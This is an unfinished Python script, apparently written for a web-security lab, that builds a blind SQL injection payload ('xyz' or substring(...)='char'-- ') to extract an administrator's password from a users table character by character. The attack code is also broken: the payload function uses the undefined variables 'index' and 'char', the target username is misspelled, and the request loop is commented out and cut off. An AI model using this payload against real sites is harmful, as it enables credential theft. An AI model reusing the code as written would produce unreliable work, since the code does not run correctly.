import sys
import logging
import urllib3
import string
import concurrent.futures

import requests

import utils
from shop import Shop

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}][{levelname}] [{name}] {message}",
    style = "{",
    datefmt="%H:%M:%S",
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
AVAIL_CHARS = string.printable

def format_length_query(inner_query, length):
    return f"xyz' or substring(({inner_query}), {index},1) = '{char}'-- "
   
    
    
    
    
"""
select password from users where username = 'administsrator'
inner query
"""    

"""
def determine_response_length(inner_query, url, no_proxy=False):
    log.info("Determining response length for query.")
    sess = requests.Session()
    for i in range(1, 5):
        outer_query = format_length_query(inner_query, i)
   """     